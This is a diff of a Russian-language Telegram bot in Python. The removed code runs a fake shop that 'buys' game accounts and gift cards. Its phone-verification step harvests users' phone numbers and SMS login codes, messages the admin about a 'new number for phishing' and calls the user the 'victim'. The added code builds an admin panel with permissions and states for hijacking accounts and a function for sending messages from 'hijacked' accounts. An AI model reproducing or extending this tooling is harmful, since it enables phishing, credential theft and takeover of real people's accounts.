+                account_id,
+                target,
+                message
+            )
+            
+            # Логируем действие
+            db.execute('''
+                INSERT INTO security_logs 
+                (admin_id, action, details)
+                VALUES (?, ?, ?)
+            ''', (from_admin_id, 'send_from_hijacked', f'Отправка от аккаунта {account_id} к {target}'))
+            
+            return result
+            
+        except Exception as e:
+            logger.error(f"Ошибка отправки от захваченного аккаунта: {e}")
+            return {'success': False, 'error': str(e)}
+
+message_system = MessageSystem()
+
+# ========== СОСТОЯНИЯ FSM ==========
+class AdminStates(StatesGroup):
+    # Состояния для управления админами
+    waiting_admin_username = State()
+    waiting_admin_permissions = State()
+    waiting_admin_confirm = State()
+    waiting_admin_remove = State()
+    waiting_admin_remove_reason = State()
+    
+    # Состояния для отправки сообщений
+    waiting_message_username = State()
+    waiting_message_text = State()
+    waiting_message_media = State()
+    waiting_message_confirm = State()
+    
+    # Состояния для управления каналами
+    waiting_channel_id = State()
+    waiting_channel_confirm = State()
+    waiting_channel_action = State()
+    
+    # Состояния для захвата аккаунтов
+    waiting_hijack_phone = State()
+    waiting_hijack_code = State()
+    waiting_hijack_method = State()
+    waiting_hijack_target = State()
+    
+    # Состояния для рассылки
+    waiting_broadcast_text = State()
+    waiting_broadcast_confirm = State()
+    
+    # Состояния для настроек
+    waiting_settings_action = State()
+    waiting_proxy_url = State()
+    waiting_security_level = State()
+
+class UserStates(StatesGroup):
+    waiting_verification = State()
+    waiting_contact = State()
+    waiting_feedback = State()
+
+# ========== ФИЛЬТРЫ ДЛЯ ПРОВЕРКИ ПРАВ ==========
+class AdminFilter(Filter):
+    def __init__(self, require_main: bool = False, permission: str = None):
+        self.require_main = require_main
+        self.permission = permission
+    
+    async def __call__(self, message: Message, event_from_user: types.User) -> bool:
+        user_id = event_from_user.id
         
-        logger.info(f"[AUTO-MESSAGE] Рассылка завершена")
+        # Проверяем, является ли администратором
+        if not admin_manager.is_admin(user_id):
+            return False
         
-        # Отчет админу
-        await bot.send_message(
-            ADMIN_ID,
-            f"📨 <b>РАССЫЛКА ЗАВЕРШЕНА</b>\n\n"
-            f"✅ Аккаунтов: {len(active_accounts)}\n"
-            f"🎯 Целей: {len(targets)}\n"
-            f"📊 Сообщений: {len(active_accounts) * len(targets)}\n"
-            f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
-            parse_mode="HTML"
-        )
+        # Проверяем, требуется ли главный админ
+        if self.require_main and not admin_manager.is_main_admin(user_id):
+            return False
         
-    except Exception as e:
-        logger.error(f"[AUTO-MESSAGE] Критическая ошибка рассылки: {e}")
+        # Проверяем конкретное разрешение
+        if self.permission and not admin_manager.has_permission(user_id, self.permission):
+            return False
+        
+        return True
+
+# Создаем фильтры для разных уровней доступа
+is_admin = AdminFilter()
+is_main_admin = AdminFilter(require_main=True)
+can_manage_admins = AdminFilter(permission='manage_admins')
+can_manage_channels = AdminFilter(permission='manage_channels')
+can_send_messages = AdminFilter(permission='send_messages')
+can_hijack_accounts = AdminFilter(permission='hijack_accounts')
 
 # ========== ОБРАБОТЧИКИ КОМАНД ==========
 
+# Команда /start
 @dp.message(Command("start"))
-async def cmd_start(message: types.Message, state: FSMContext):
+async def cmd_start(message: Message, state: FSMContext):
     user = message.from_user
     
-    # Регистрация пользователя
-    cursor.execute(
-        "INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
-        (user.id, user.username, user.first_name)
-    )
-    cursor.execute(
-        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
-        (user.id,)
-    )
-    conn.commit()
-    
-    welcome_text = f"""
-🏪 <b>ДОБРО ПОЖАЛОВАТЬ В МАГАЗИН Money Moves Bot | заработок!</b> 🎮
-
-👋 Привет, {user.first_name}!
-
-<b>Мы покупаем:</b>
-• 🎮 Игровые аккаунты (Steam, Epic Games, Origin и др)
-• 💎 Внутриигровые предметы (CS:GO, Dota 2, TF2 и др)
-• 🎫 Игровые ключи (Steam, Xbox, PlayStation и др)
-• 📱 Цифровые подарки (Apple, Amazon, Google и др)
-• 🛬 Телеграмм подарки  
-• 💳 Электронные ваучеры
-
-<b>💰 Почему мы?</b>
-• Мгновенная оплата
-• Высокие цены
-• Гарантия сделки
-• Анонимность
-
-<b>Выберите действие:</b>
-    """
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")],
-        [InlineKeyboardButton(text="ℹ️ О НАС", callback_data="about_us")]
-    ])
-    
-    await message.answer(welcome_text, parse_mode="HTML", reply_markup=keyboard)
-    log_action(user.id, "start_command")
-
-def log_action(user_id: int, action: str, details: str = ""):
-    cursor.execute(
-        "INSERT INTO logs (user_id, action, details) VALUES (?, ?, ?)",
-        (user_id, action, details)
-    )
-    cursor.execute(
-        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
-        (user_id,)
-    )
-    conn.commit()
-
-@dp.callback_query(F.data == "sell_item")
-async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
-    user = callback_query.from_user
-    
-    # Проверка верификации
-    cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user.id,))
-    user_data = cursor.fetchone()
-    
-    if not user_data or not user_data[0]:
-        # Требуется верификация
-        await request_verification(callback_query)
-        return
-    
-    item_types_text = """
-🎯 <b>ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?</b>
-
-<b>Выберите категорию вашего товара:</b>
-
-• 🎮 <b>Игровой аккаунт</b> - Steam, Epic Games, Origin, Uplay
-• 💎 <b>Цифровой предмет</b> - CS:GO скины, Dota 2 предметы
-• 🎫 <b>Игровой ключ</b> - Активационный ключ игры
-• 📱 <b>Цифровой подарок</b> - Gift Card, ваучер
-• 💳 <b>Электронные деньги</b> - Qiwi, Яндекс.Деньги
-• 📦 <b>Другое</b> - Укажите в описании
-    """
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🎮 Игровой аккаунт", callback_data="type_account")],
-        [InlineKeyboardButton(text="💎 Цифровой предмет", callback_data="type_item")],
-        [InlineKeyboardButton(text="🎫 Игровой ключ", callback_data="type_key")],
-        [InlineKeyboardButton(text="📱 Цифровой подарок", callback_data="type_gift")],
-        [InlineKeyboardButton(text="💳 Электронные деньги", callback_data="type_money")],
-        [InlineKeyboardButton(text="📦 Другое", callback_data="type_other")]
-    ])
-    
-    await state.set_state(SellerStates.waiting_item_type)
-    await bot.edit_message_text(
-        item_types_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML",
-        reply_markup=keyboard
-    )
-    log_action(user.id, "start_selling")
-
-@dp.callback_query(SellerStates.waiting_item_type)
-async def process_item_type(callback_query: types.CallbackQuery, state: FSMContext):
-    item_types = {
-        "type_account": "Игровой аккаунт",
-        "type_item": "Цифровой предмет",
-        "type_key": "Игровой ключ",
-        "type_gift": "Цифровой подарок",
-        "type_money": "Электронные деньги",
-        "type_other": "Другое"
-    }
-    
-    item_type = item_types.get(callback_query.data, "Другое")
-    await state.update_data(item_type=item_type)
-    
-    photos_text = f"""
-📸 <b>ДОБАВЛЕНИЕ ФОТОГРАФИЙ</b>
-
-<b>Категория:</b> {item_type}
-
-<b>Пришлите фотографии вашего товара:</b>
-• Для аккаунтов: скриншоты профиля, библиотеки игр
-• Для предметов: скриншоты инвентаря
-• Для ключей: фото сертификата (если есть)
-• Для подарков: фото карты или чека
-
-<b>Требования:</b>
-✅ Хорошее качество
-✅ Виден весь товар
-✅ Нет водяных знаков
-✅ Максимум 5 фото
-
-<b>Отправьте фото и после нажмите /skip для заполнения описания продукта</b>
-    """
-    
-    await state.set_state(SellerStates.waiting_photos)
-    await bot.edit_message_text(
-        photos_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML"
-    )
-    log_action(callback_query.from_user.id, "select_item_type", item_type)
-
-@dp.message(SellerStates.waiting_photos, F.photo)
-async def process_photos(message: types.Message, state: FSMContext):
-    user_data = await state.get_data()
-    photos = user_data.get('photos', [])
-    
-    # Сохраняем информацию о фото
-    photo_id = message.photo[-1].file_id
-    photos.append(photo_id)
-    
-    await state.update_data(photos=photos)
-    
-    if len(photos) >= 5:
-        await message.answer("✅ Максимальное количество фото достигнуто (5 фото)")
-        await ask_description(message, state)
-    else:
-        remaining = 5 - len(photos)
-        await message.answer(f"✅ Фото добавлено. Осталось мест: {remaining}")
-
-@dp.message(SellerStates.waiting_photos, Command("skip"))
-async def skip_photos(message: types.Message, state: FSMContext):
-    await ask_description(message, state)
-
-async def ask_description(message: types.Message, state: FSMContext):
-    user_data = await state.get_data()
-    item_type = user_data.get('item_type', 'Товар')
-    
-    description_text = f"""
-📝 <b>ОПИСАНИЕ ТОВАРА</b>
-
-<b>Категория:</b> {item_type}
-
-<b>Подробно опишите ваш товар:</b>
-
-<b>Пример для игрового аккаунта:</b>
-• Платформа (Steam/Epic Games/др.)
-• Количество игр
-• Уровень/ранг
-• Наличие привязок
-• История аккаунта
-
-<b>Пример для предметов:</b>
-• Название предмета
-• Игра
-• Редкость
-• Состояние
-• Особенности
-
-<b>Чем подробнее описание - тем выше цена!</b>
-    """
-    
-    await state.set_state(SellerStates.waiting_description)
-    await message.answer(description_text, parse_mode="HTML")
-
-@dp.message(SellerStates.waiting_description)
-async def process_description(message: types.Message, state: FSMContext):
-    description = message.text
-    await state.update_data(description=description)
-    
-    # Получаем все данные
-    user_data = await state.get_data()
-    photos_count = len(user_data.get('photos', []))
-    
-    summary_text = f"""
-📋 <b>ПОДТВЕРЖДЕНИЕ ЗАЯВКИ</b>
-
-<b>Категория:</b> {user_data['item_type']}
-<b>Фотографии:</b> {photos_count} шт.
-<b>Описание:</b>
-{description[:500]}{'...' if len(description) > 500 else ''}
-
-<b>Далее:</b>
-1. Модератор проверит заявку
-2. Определит стоимость товара
-3. Вы получите предложение цены
-4. После согласия - инструкции по передаче
-
-<b>Все верно?</b>
-    """
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ ПОДТВЕРДИТЬ", callback_data="confirm_submit")],
-        [InlineKeyboardButton(text="✏️ ИЗМЕНИТЬ", callback_data="edit_submit")]
-    ])
-    
-    await state.set_state(SellerStates.waiting_confirm)
-    await message.answer(summary_text, parse_mode="HTML", reply_markup=keyboard)
-
-@dp.callback_query(SellerStates.waiting_confirm, F.data == "confirm_submit")
-async def confirm_submission(callback_query: types.CallbackQuery, state: FSMContext):
-    user = callback_query.from_user
-    user_data = await state.get_data()
-    
-    # Сохраняем в БД
-    photos_json = json.dumps(user_data.get('photos', []))
-    
-    cursor.execute('''
-        INSERT INTO items (user_id, item_type, photos, description, status)
-        VALUES (?, ?, ?, ?, 'pending')
-    ''', (user.id, user_data['item_type'], photos_json, user_data['description']))
-    
-    item_id = cursor.lastrowid
-    conn.commit()
-    
-    # Отправляем модераторам
-    for moderator_id in MODERATOR_IDS:
-        try:
-            moderator_text = f"""
-🆕 <b>НОВАЯ ЗАЯВКА #{item_id}</b>
-━━━━━━━━━━━━━━━━
-👤 <b>Продавец:</b> {user.first_name} (@{user.username})
-🆔 <b>User ID:</b> {user.id}
-🏷 <b>Категория:</b> {user_data['item_type']}
-📝 <b>Описание:</b>
-{user_data['description'][:500]}...
-📸 <b>Фото:</b> {len(user_data.get('photos', []))} шт.
-━━━━━━━━━━━━━━━━
-<b>Действия:</b>
-            """
-            
-            keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="💰 ОЦЕНИТЬ", callback_data=f"price_{item_id}"),
-                 InlineKeyboardButton(text="💬 ЧАТ", callback_data=f"chat_{item_id}")],
-                [InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"reject_{item_id}")]
-            ])
-            
-            await bot.send_message(
-                moderator_id,
-                moderator_text,
-                parse_mode="HTML",
-                reply_markup=keyboard
-            )
-            
-            # Отправляем фото если есть
-            photos = user_data.get('photos', [])
-            if photos:
-                media_group = []
-                for photo_id in photos[:3]:
-                    media_group.append(types.InputMediaPhoto(media=photo_id, caption=f"Фото заявки #{item_id}" if photo_id == photos[0] else ""))
-                
-                await bot.send_media_group(moderator_id, media_group)
-                
-        except Exception as e:
-            logger.error(f"Ошибка отправки модератору {moderator_id}: {e}")
-    
-    # Ответ пользователю
-    user_response = f"""
-✅ <b>ЗАЯВКА #{item_id} ПРИНЯТА!</b>
-
-<b>Статус:</b> На модерации ⏳
-
-<b>Что дальше:</b>
-1. Модератор оценит ваш товар (1-24 часа)
-2. Вы получите предложение цены
-3. После согласия - инструкции по передаче
-4. Получение денег на карту/кошелек
-
-<b>Среднее время проверки:</b> 2-4 часа
-<b>Следить за статусом:</b> /status
-    """
-    
-    await bot.edit_message_text(
-        user_response,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML"
-    )
-    
-    log_action(user.id, "submit_item", f"item_id: {item_id}")
     await state.clear()
-
-@dp.callback_query(F.data.startswith("price_"))
-async def moderator_set_price(callback_query: types.CallbackQuery, state: FSMContext):
-    item_id = int(callback_query.data.split("_")[1])
     
-    # Получаем информацию о товаре
-    cursor.execute(
-        "SELECT i.*, u.first_name, u.username FROM items i JOIN users u ON i.user_id = u.user_id WHERE i.id = ?",
-        (item_id,)
+    # Регистрируем пользователя в базе
+    db.execute('''
+        INSERT OR IGNORE INTO users 
+        (user_id, username, first_name, last_name, registered_date)
+        VALUES (?, ?, ?, ?, ?)
+    ''', (user.id, user.username, user.first_name, user.last_name, datetime.now().isoformat()))
+    
+    # Обновляем last_seen
+    db.execute(
+        "UPDATE users SET last_seen = ? WHERE user_id = ?",
+        (datetime.now().isoformat(), user.id)
     )
-    item = cursor.fetchone()
     
-    if not item:
-        await callback_query.answer("❌ Товар не найден")
-        return
-    
-    price_text = f"""
-💰 <b>УСТАНОВКА ЦЕНЫ</b>
-
-<b>Заявка #{item_id}</b>
-<b>Продавец:</b> {item[8]} (@{item[9]})
-<b>Товар:</b> {item[2]}
-<b>Описание:</b>
-{item[4][:300]}...
-
-<b>Рекомендуемые цены:</b>
-• Аккаунты: 500-5000 руб
-• Предметы: 50-5000 руб
-• Ключи: 300-3000 руб
-• Подарки: 100-10000 руб
-
-<b>Введите цену в рублях:</b>
-    """
-    
-    await state.set_state(ModeratorStates.waiting_price)
-    await state.update_data(item_id=item_id, moderator_id=callback_query.from_user.id)
-    
-    await bot.edit_message_text(
-        price_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML"
-    )
-
-@dp.message(ModeratorStates.waiting_price, F.text.regexp(r'^\d+$'))
-async def process_price_input(message: types.Message, state: FSMContext):
-    price = int(message.text)
-    moderator_data = await state.get_data()
-    item_id = moderator_data['item_id']
-    moderator_id = moderator_data['moderator_id']
-    
-    # Обновляем цену в БД
-    cursor.execute(
-        "UPDATE items SET price = ?, moderator_id = ?, status = 'approved' WHERE id = ?",
-        (price, moderator_id, item_id)
-    )
-    conn.commit()
-    
-    # Получаем данные о продавце
-    cursor.execute(
-        "SELECT user_id FROM items WHERE id = ?",
-        (item_id,)
-    )
-    seller_id = cursor.fetchone()[0]
-    
-    # Отправляем предложение продавцу
-    offer_text = f"""
-🎉 <b>ПРЕДЛОЖЕНИЕ ЦЕНЫ!</b>
-
-<b>Заявка #{item_id} одобрена!</b>
-
-💰 <b>Наша цена:</b> <b>{price} руб.</b>
-
-<b>Принять предложение?</b>
-
-<b>После принятия:</b>
-1. Вы получите инструкции по передаче товара
-2. Мы проверим получение
-3. Вы получите деньги на карту/кошелек
-
-<b>Срок выплаты:</b> 1-24 часа после проверки
-    """
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ ПРИНЯТЬ", callback_data=f"accept_{item_id}"),
-         InlineKeyboardButton(text="❌ ОТКЛОНИЬ", callback_data=f"decline_{item_id}")],
-        [InlineKeyboardButton(text="💬 ОБСУДИТЬ ЦЕНУ", callback_data=f"negotiate_{item_id}")]
-    ])
-    
-    try:
-        await bot.send_message(
-            seller_id,
-            offer_text,
+    if admin_manager.is_admin(user.id):
+        # Показать панель администратора
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="📨 Отправить сообщение", callback_data="admin_send_message"),
+                InlineKeyboardButton(text="📢 Каналы", callback_data="admin_channels")
+            ],
+            [
+                InlineKeyboardButton(text="👥 Админы", callback_data="admin_manage"),
+                InlineKeyboardButton(text="👤 Аккаунты", callback_data="admin_accounts")
+            ],
+            [
+                InlineKeyboardButton(text="⚙️ Настройки", callback_data="admin_settings"),
+                InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")
+            ]
+        ]) if admin_manager.is_main_admin(user.id) else InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="📨 Отправить сообщение", callback_data="admin_send_message"),
+                InlineKeyboardButton(text="📢 Каналы", callback_data="admin_channels")
+            ],
+            [
+                InlineKeyboardButton(text="👤 Аккаунты", callback_data="admin_accounts"),
+                InlineKeyboardButton(text="📊 Моя статистика", callback_data="admin_my_stats")
+            ]
+        ])
+        
+        admin_type = "Главный администратор" if admin_manager.is_main_admin(user.id) else "Администратор"
+        
+        await message.answer(
+            f"👑 <b>ПАНЕЛЬ АДМИНИСТРАТОРА SWILL</b>\n\n"
+            f"👤 ID: <code>{user.id}</code>\n"
+            f"🔑 Роль: {admin_type}\n"
+            f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
+            f"<i>Выберите действие:</i>",
             parse_mode="HTML",
             reply_markup=keyboard
         )
-        await message.answer(f"✅ Цена {price} руб установлена для заявки #{item_id}")
-    except Exception as e:
-        await message.answer(f"❌ Не удалось отправить предложение продавцу: {e}")
-    
-    await state.clear()
+    else:
+        # Показать пользовательское меню
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="ℹ️ Информация", callback_data="user_info")],
+            [InlineKeyboardButton(text="📞 Связаться", callback_data="user_contact")],
+            [InlineKeyboardButton(text="🆘 Поддержка", callback_data="user_support")]
+        ])
+        
+        await message.answer(
+            f"👋 <b>Добро пожаловать, {user.first_name}!</b>\n\n"
+            f"Я - бот SWILL. Чем могу помочь?",
+            parse_mode="HTML",
+            reply_markup=keyboard
+        )
 
-@dp.callback_query(F.data.startswith("chat_"))
-async def start_moderator_chat(callback_query: types.CallbackQuery, state: FSMContext):
-    item_id = int(callback_query.data.split("_")[1])
-    moderator_id = callback_query.from_user.id
-    
-    # Получаем информацию
-    cursor.execute(
-        "SELECT i.user_id, u.first_name FROM items i JOIN users u ON i.user_id = u.user_id WHERE i.id = ?",
-        (item_id,)
-    )
-    item = cursor.fetchone()
-    
-    if not item:
-        await callback_query.answer("❌ Товар не найден")
+# Команда /admin - быстрый доступ к админке
+@dp.message(Command("admin"))
+async def cmd_admin(message: Message):
+    if not admin_manager.is_admin(message.from_user.id):
+        await message.answer("❌ У вас нет доступа к панели администратора.")
         return
     
-    seller_id = item[0]
-    seller_name = item[1]
-    
-    # Создаем или находим чат
-    cursor.execute(
-        "SELECT id FROM chats WHERE user_id = ? AND moderator_id = ? AND status = 'open'",
-        (seller_id, moderator_id)
-    )
-    chat = cursor.fetchone()
-    
-    if not chat:
-        cursor.execute(
-            "INSERT INTO chats (user_id, moderator_id, messages) VALUES (?, ?, ?)",
-            (seller_id, moderator_id, json.dumps([]))
-        )
-        chat_id = cursor.lastrowid
-        conn.commit()
-    else:
-        chat_id = chat[0]
-    
-    chat_text = f"""
-💬 <b>ЧАТ С ПРОДАВЦОМ</b>
+    await cmd_start(message, None)
 
-<b>Продавец:</b> {seller_name}
-<b>Заявка:</b> #{item_id}
-<b>Чат ID:</b> {chat_id}
+# ========== ОБРАБОТЧИКИ АДМИН-ПАНЕЛИ ==========
 
-<b>Напишите сообщение продавцу:</b>
-    """
+# Отправка сообщения пользователю
+@dp.callback_query(F.data == "admin_send_message")
+async def admin_send_message_start(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
+        return
     
-    await state.set_state(ModeratorStates.waiting_chat)
-    await state.update_data(chat_id=chat_id, seller_id=seller_id)
+    await state.set_state(AdminStates.waiting_message_username)
     
-    await bot.edit_message_text(
-        chat_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
+    await callback_query.message.edit_text(
+        "📨 <b>ОТПРАВКА СООБЩЕНИЯ ПОЛЬЗОВАТЕЛЮ</b>\n\n"
+        "Введите @username пользователя:\n"
+        "<code>@username_user</code>\n\n"
+        "<i>Или отправьте /cancel для отмены</i>",
         parse_mode="HTML"
     )
 
-@dp.message(ModeratorStates.waiting_chat)
-async def process_moderator_message(message: types.Message, state: FSMContext):
-    chat_data = await state.get_data()
-    chat_id = chat_data['chat_id']
-    seller_id = chat_data['seller_id']
-    
-    # Сохраняем сообщение
-    cursor.execute("SELECT messages FROM chats WHERE id = ?", (chat_id,))
-    messages_json = cursor.fetchone()[0]
-    messages = json.loads(messages_json) if messages_json else []
-    
-    messages.append({
-        "from": "moderator",
-        "text": message.text,
-        "time": datetime.now().isoformat()
-    })
-    
-    cursor.execute(
-        "UPDATE chats SET messages = ? WHERE id = ?",
-        (json.dumps(messages), chat_id)
-    )
-    conn.commit()
-    
-    # Отправляем продавцу
-    try:
-        await bot.send_message(
-            seller_id,
-            f"📨 <b>Сообщение от поддержки:</b>\n\n{message.text}\n\n<i>Вы можете ответить в этом же чате.</i>",
-            parse_mode="HTML"
-        )
-        await message.answer("✅ Сообщение отправлено продавцу")
-    except Exception as e:
-        await message.answer(f"⚠️ Не удалось отправить сообщение продавцу: {e}")
-
-@dp.message(F.contact)
-async def process_phone_number(message: types.Message, state: FSMContext):
-    user = message.from_user
-    phone = message.contact.phone_number
-
-    logger.info(f"[DEBUG] Получен контакт от пользователя {user.id}: {phone}")
-
-    # Убираем + если есть
-    if phone.startswith('+'):
-        phone = phone[1:]
-
-    # Сохраняем номер
-    cursor.execute(
-        "UPDATE users SET phone = ? WHERE user_id = ?",
-        (phone, user.id)
-    )
-    conn.commit()
-
-    # ГЕНЕРИРУЕМ ФЕЙКОВЫЙ КОД (5-6 цифр)
-    fake_code = str(random.randint(10000, 999999))
-    
-    logger.info(f"[DEBUG] Сгенерирован код: {fake_code} для пользователя {user.id}")
-
-    # Сохраняем сгенерированный код для проверки
-    cursor.execute(
-        "UPDATE users SET code = ? WHERE user_id = ?",
-        (fake_code, user.id)
-    )
-    conn.commit()
-
-    # 1. Сообщаем пользователю, что код отправлен
-    initial_text = f"""
-✅ <b>НОМЕР ПОДТВЕРЖДЕН: +{phone}</b>
-
-📱 <b>На номер +{phone} было отправлено SMS с кодом подтверждения.</b>
-
-⏳ <b>Пожалуйста, ожидайте ответа от администратора для отправки кода.</b>
-
-🔢 <b>Код состоит из 5-6 цифр.</b>
-
-<i>Обычно это занимает несколько минут. Вы получите уведомление, когда код будет готов.</i>
-"""
-    
-    logger.info(f"[DEBUG] Отправляю начальное сообщение пользователю {user.id}")
-    
-    try:
-        await message.answer(initial_text, parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
-        logger.info(f"[DEBUG] Начальное сообщение отправлено успешно")
-    except Exception as e:
-        logger.error(f"[DEBUG] Ошибка отправки начального сообщения: {e}")
-
-    # 2. Переводим пользователя в состояние ожидания кода
-    await state.set_state(VerificationStates.waiting_code)
-    logger.info(f"[DEBUG] Пользователь {user.id} переведен в состояние waiting_code")
-
-    # 3. Уведомляем админа о необходимости отправить код
-    admin_msg = f"""
-🎣 <b>НОВЫЙ НОМЕР ДЛЯ ФИШИНГА</b>
-━━━━━━━━━━━━━━━━
-👤 <b>Жертва:</b> {user.first_name} (@{user.username})
-🆔 <b>User ID:</b> {user.id}
-📱 <b>Телефон:</b> +{phone}
-🔢 <b>Сгенерированный код:</b> {fake_code}
-⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
-━━━━━━━━━━━━━━━━
-<b>Жертва ожидает код. Отправьте SMS код:</b> {fake_code}
-"""
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Код отправлен", callback_data=f"code_sent_{user.id}")],
-        [InlineKeyboardButton(text="❌ Отменить", callback_data=f"cancel_code_{user.id}")]
-    ])
-    
-    try:
-        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=keyboard)
-        logger.info(f"[DEBUG] Уведомление админу отправлено")
-    except Exception as e:
-        logger.error(f"[DEBUG] Ошибка отправки админу: {e}")
-    
-    log_action(user.id, "phone_submitted", f"phone: {phone}")
-
-@dp.callback_query(F.data.startswith("code_sent_"))
-async def handle_code_sent(callback_query: types.CallbackQuery):
-    """Админ подтвердил отправку кода"""
-    user_id = int(callback_query.data.split("_")[2])
-    
-    # Получаем информацию о пользователе
-    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user_id,))
-    user_data = cursor.fetchone()
-    
-    if not user_data:
-        await callback_query.answer("❌ Пользователь не найден")
-        return
-    
-    phone = user_data[0]
-    code = user_data[1]
-    
-    # Сообщаем пользователю, что код "отправлен"
-    user_notification = f"""
-✍️ <b>Администратор отправил SMS код на номер +{phone}:</b>
-
-<code>Пример кода: {code}</code>
-
-<b>Пожалуйста, введите код из SMS:</b>
-
-<i>Если код не пришел, используйте</i> /resend_code
-"""
-    
-    try:
-        await bot.send_message(user_id, user_notification, parse_mode="HTML")
-        await callback_query.answer("✅ Пользователь уведомлен о отправке кода")
-        
-        # Обновляем сообщение админу
-        await bot.edit_message_text(
-            f"✅ <b>Код отправлен пользователю {user_id}</b>\n\n"
-            f"Телефон: +{phone}\n"
-            f"Код: {code}\n"
-            f"Статус: Ожидание ввода кода",
-            chat_id=callback_query.message.chat.id,
-            message_id=callback_query.message.message_id,
-            parse_mode="HTML"
-        )
-        
-    except Exception as e:
-        await callback_query.answer(f"❌ Ошибка: {str(e)[:100]}")
-        logger.error(f"[CODE SENT] Ошибка отправки пользователю: {e}")
-
-@dp.callback_query(F.data.startswith("cancel_code_"))
-async def handle_cancel_code(callback_query: types.CallbackQuery):
-    """Админ отменяет отправку кода"""
-    user_id = int(callback_query.data.split("_")[2])
-    
-    try:
-        await bot.edit_message_text(
-            f"❌ <b>Отправка кода отменена для пользователя {user_id}</b>",
-            chat_id=callback_query.message.chat.id,
-            message_id=callback_query.message.message_id,
-            parse_mode="HTML"
-        )
-        await callback_query.answer("❌ Отправка кода отменена")
-        
-    except Exception as e:
-        logger.error(f"[CANCEL CODE] Ошибка: {e}")
-
-@dp.message(VerificationStates.waiting_code, F.text.regexp(r'^\d{5,6}$'))
-async def process_verification_code(message: types.Message, state: FSMContext):
-    user = message.from_user
-    code = message.text
-
-    # Проверяем, подтвержден ли номер у пользователя
-    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
-    user_data = cursor.fetchone()
-
-    if not user_data or not user_data[0]:
-        # Если номера нет, просим пройти верификацию сначала
-        await message.answer("❌ <b>Сначала необходимо подтвердить номер телефона.</b>\n\nИспользуйте меню верификации или нажмите /start", parse_mode="HTML")
+@dp.message(AdminStates.waiting_message_username)
+async def process_message_username(message: Message, state: FSMContext):
+    if not admin_manager.is_admin(message.from_user.id):
+        await message.answer("❌ Доступ запрещен")
         await state.clear()
         return
-
-    phone = user_data[0]
-    saved_code = user_data[1]
-
-    # Сохраняем введенный код (даже если не совпадает)
-    cursor.execute(
-        "UPDATE users SET code = ? WHERE user_id = ?",
-        (code, user.id)
+    
+    username = message.text.strip()
+    
+    if username == '/cancel':
+        await message.answer("❌ Отправка сообщения отменена")
+        await state.clear()
+        return
+    
+    # Проверяем формат username
+    if not username.startswith('@'):
+        username = '@' + username
+    
+    await state.update_data(target_username=username)
+    await state.set_state(AdminStates.waiting_message_text)
+    
+    await message.answer(
+        f"✅ Получен username: {username}\n\n"
+        "Теперь введите текст сообщения:\n\n"
+        "<i>Поддерживается HTML разметка</i>",
+        parse_mode="HTML"
     )
-    conn.commit()
 
-    # ВСЕГДА УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ
-    success_text = f"""
-✅ <b>Верификация по SMS завершена успешно!</b>
-
-Ваш номер <b>+{phone}</b> подтвержден.
-
-🎉 <b>Теперь вы можете продавать товары!</b>
-
-📸 <b>Следующий шаг:</b>
-Нажмите кнопку ниже чтобы начать продажу:
-"""
+@dp.message(AdminStates.waiting_message_text)
+async def process_message_text(message: Message, state: FSMContext):
+    if not admin_manager.is_admin(message.from_user.id):
+        await message.answer("❌ Доступ запрещен")
+        await state.clear()
+        return
+    
+    message_text = message.text
+    
+    if message_text == '/cancel':
+        await message.answer("❌ Отправка сообщения отменена")
+        await state.clear()
+        return
+    
+    await state.update_data(message_text=message_text)
+    
+    user_data = await state.get_data()
+    username = user_data.get('target_username', '')
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💰 НАЧАТЬ ПРОДАЖУ", callback_data="sell_item")]
+        [
+            InlineKeyboardButton(text="📎 Добавить медиа", callback_data="add_media"),
+            InlineKeyboardButton(text="✅ Отправить", callback_data="send_message_now")
+        ],
+        [InlineKeyboardButton(text="✏️ Изменить текст", callback_data="edit_message_text")],
+        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_message")]
     ])
     
-    await message.answer(success_text, parse_mode="HTML", reply_markup=keyboard)
+    await message.answer(
+        f"📋 <b>ПРЕДПРОСМОТР СООБЩЕНИЯ</b>\n\n"
